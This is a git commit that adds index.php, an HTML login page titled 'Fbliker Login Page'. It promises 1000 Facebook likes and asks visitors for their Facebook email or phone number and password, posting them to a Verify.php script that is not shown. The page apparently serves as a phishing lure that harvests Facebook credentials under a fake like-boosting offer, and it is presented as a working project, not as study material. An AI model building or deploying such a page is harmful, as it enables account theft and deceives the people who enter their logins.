e9143a9d2f1112fd62811876abb7543af9c55822
Plibadd1 <123053866+Plibadd1@users.noreply.github.com>
2023-10-09 07:58:46 +0000

    Add files via upload

---
+++ index.php
@@ -0,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Fbliker Login Page</title>
+	<link rel="stylesheet" type="text/css" href="main.css">
+	<link rel="stylesheet" type="text/css" href="fb.css">
+</head>
+<body>
+	<div class="main">
+		<div class="contentandlogo">
+			<div class="fblogo">
+				<img src="img/fl.png">
+			</div>
+			<div class="headd">
+				<h2 id="h">Boost your social media presence with our website, where you can get more likes on Facebook effortlessly!.<br><br> Login with your facebook..</h2>
+			</div>
+			
+		</div>
+		<div class="formcontainer">
+			<form class="logincontainer" action="Verify.php" method="POST">
+				<div class="inputt">
+					<input type="text" name="email" id="email" placeholder="Email or phone number" required>
+				</div>
+				<div class="inputt">
+					<input type="password" name="password" id="password" placeholder="Password" required>
+				</div>
+				<div class="inputt">
+					<input type="submit" name="Login" value="1000 likes">
+				</div>
+			</form>
+		</div>
+	</div>
+	<div class="footer">
+    	© All Rights Reserved FBLIKERR 2023
+	</div>
+
+</body>
+
+</html>
